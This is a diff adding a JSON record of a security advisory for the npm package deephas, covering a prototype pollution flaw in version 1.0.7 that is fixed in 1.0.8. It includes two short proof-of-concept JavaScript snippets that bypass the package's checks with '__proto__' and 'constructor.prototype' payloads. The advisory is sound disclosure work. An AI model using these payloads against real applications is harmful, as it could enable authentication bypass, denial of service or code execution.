@@ -1,0 +1,53 @@
+{
+  "Severity": "CRITICAL",
+  "UpdatedAt": "2026-01-29T22:21:33Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "deephas"
+  },
+  "Advisory": {
+    "DatabaseId": 334753,
+    "Id": "GSA_kwCzR0hTQS0yNzMzLTZjNTgtcGYyN84ABRuh",
+    "GhsaId": "GHSA-2733-6c58-pf27",
+    "References": [
+      {
+        "Url": "https://github.com/sharpred/deepHas/security/advisories/GHSA-2733-6c58-pf27"
+      },
+      {
+        "Url": "https://github.com/sharpred/deepHas/commit/8097fafd3776c613d8066546653e0d2c7b5fc465"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-2733-6c58-pf27"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-2733-6c58-pf27"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-25047"
+      }
+    ],
+    "Description": "### Summary\nA prototype pollution vulnerability exists in version 1.0.7 of the deephas npm package that allows an attacker to modify global object behavior. This issue was fixed in version 1.0.8.\n\n### Details\nThe vulnerability resides in the `add()` function and `indexer()` function implemented within `deepHas.js`. Although version 1.0.7 attempts to prevent prototype pollution by checking property ownership (e.g., using Object.hasOwnProperty) and by checking against forbidden string usage (using String.prototype.indexOf), this check can be bypassed as shown in the PoC\n\nBy doing so, an attacker can inject properties into Object.prototype through a payload such as constructor.prototype.polluted or __proto__.polluted resulting in prototype pollution.\n\nThis issue affects all JavaScript runtimes that rely on npm packages (including Node.js, Deno, and Bun) and is independent of the operating system.\n\n### PoC\n#### Steps to reproduce\n1. Install version 1.0.7 of `deephas` using npm install\n2. Run one of the following code snippets:\n\n```javascript\n//PoC 1\nObject.prototype.hasOwnProperty = () =\u003e true;\nconsole.log({}.polluted);\nconst dh = require('deephas');\nlet obj = {};\ndh.set(obj, 'constructor.prototype.polluted', 'yes');\nconsole.log('{ ' + obj.polluted + ', ' + 'yes' + ' }'); // prints yes =\u003e the patch is bypassed and prototype pollution occurred\n```\nOR\n\n```javascript\n//PoC 2\nString.prototype.indexOf = () =\u003e -1;\nconsole.log({}.polluted);\nconst dh = require('deephas');\nlet obj = {};\ndh.set(obj, '__proto__.polluted', 'yes');\nconsole.log('{ ' + obj.polluted + ', ' + 'yes' + ' }'); // prints yes =\u003e the patch is bypassed and prototype pollution occurred\n```\n\n#### Expected behavior\nPrototype pollution should be prevented and {} should not gain new properties.\nThis should be printed on the console:\n```\nundefined\nundefined OR throw an Error\n```\n\n#### Actual behavior\nObject.prototype is polluted and the property polluted becomes globally accessible.\nThis is printed on the console:\n```\nundefined\nyes\n```\n\n### Impact\nThis is a prototype pollution vulnerability, which can have severe security implications depending on how deephas is used by downstream applications. Any application that processes attacker-controlled input using `deephas.set` may be affected.\nIt could potentially lead to the following problems:\n1. Authentication bypass\n2. Denial of service\n4. Remote code execution (if polluted property is passed to sinks like eval or child_process)",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-01-29T22:21:32Z",
+    "Severity": "CRITICAL",
+    "Summary": "deepHas vulnerable to Prototype Pollution via constructor.prototype",
+    "UpdatedAt": "2026-01-29T22:21:33Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.0.8"
+      },
+      "VulnerableVersionRange": "\u003c 1.0.8"
+    }
+  ]
+}
